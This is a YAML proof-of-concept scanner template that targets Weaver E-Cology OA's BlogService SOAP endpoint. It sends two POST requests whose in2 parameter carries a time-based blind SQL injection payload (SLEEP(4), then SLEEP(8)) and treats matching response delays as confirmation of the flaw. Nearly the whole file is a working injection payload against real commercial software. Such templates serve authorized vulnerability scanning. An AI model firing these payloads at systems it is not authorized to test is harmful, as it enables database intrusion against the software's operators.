name: poc-yaml-WeaverOA-E-Cology-BlogService-sql
transport: http

rules:
  r0:
    request:
      method: POST
      path: /services/BlogService
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Content-Type: text/xml;charset=UTF-8
      body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
            <web:sendSubmitRemind>
              <!--type: string-->
              <web:in0>1</web:in0>
              <!--type: string-->
              <web:in1>2</web:in1>
              <!--type: string-->
              <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(4)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
            </web:sendSubmitRemind>
          </soapenv:Body>
        </soapenv:Envelope>
    expression: response.latency >= 4000 && response.latency <= 5000
  r1:
    request:
      method: POST
      path: /services/BlogService
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
        Content-Type: text/xml;charset=UTF-8
      body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
            <web:sendSubmitRemind>
              <!--type: string-->
              <web:in0>1</web:in0>
              <!--type: string-->
              <web:in1>2</web:in1>
              <!--type: string-->
              <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(8)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
            </web:sendSubmitRemind>
          </soapenv:Body>
        </soapenv:Envelope>
    expression: response.latency >= 8000 && response.latency <= 9000
expression: r0() && r1() 

